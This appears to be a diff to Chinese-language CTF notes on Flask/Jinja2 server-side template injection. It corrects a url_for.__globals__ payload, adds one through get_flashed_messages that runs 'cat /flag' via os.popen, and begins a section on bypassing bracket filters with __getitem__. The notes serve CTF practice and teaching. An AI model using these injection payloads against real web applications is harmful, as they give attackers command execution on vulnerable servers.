@@ -183,7 +183,15 @@ for i in range(500):
 通过url_for,调用os
 
 ```php
-{{url__for.__globals__.os.popen('cat /flag').read()}}
+{{url_for.__globals__.os.popen('cat /flag').read()}}
+```
+
+通过get_flashed_messages
+
+返回之前在Flask中通过 flash() 传入的闪现信息列表。把字符串对象表示的消息加入到一个消息队列中，然后通过调用 get_flashed_messages() 方法取出(闪现信息只能取出一次，取出后闪现信息会被清空)。
+
+```php
+{{get_flashed_messages.__globals__.os.popen('cat /flag').read()}}
 ```
 
 在已经加载os模块的子类中直接调用os模块
@@ -335,3 +343,10 @@ for i in range(500):
 ```
 
 # 7.绕过中括号过滤
+
+是哦用getitem函数  
+
+```
+__getitem__()=[]
+```
+
